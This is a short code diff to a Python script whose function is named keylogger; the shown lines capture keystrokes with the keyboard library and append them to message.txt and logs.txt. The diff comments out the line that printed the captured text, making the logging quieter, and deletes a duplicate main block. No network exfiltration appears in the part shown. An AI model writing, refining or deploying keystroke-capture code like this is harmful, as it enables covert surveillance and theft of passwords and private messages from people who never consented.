@@ -9,7 +9,7 @@ def keylogger():
         event = keyboard.read_event()
         if event.event_type == "down":
             text += event.name
-            print(text)
+            #print(text)
         with open(f"message.txt", "a") as file:
             file.write(text)
             with open("logs.txt", "a") as file:
@@ -42,9 +42,3 @@ keyboard.on_press(on_key)
 
 if __name__ == '__main__':
     keylogger()
-
-
-
-if __name__ == '__main__':
-    keylogger()
-
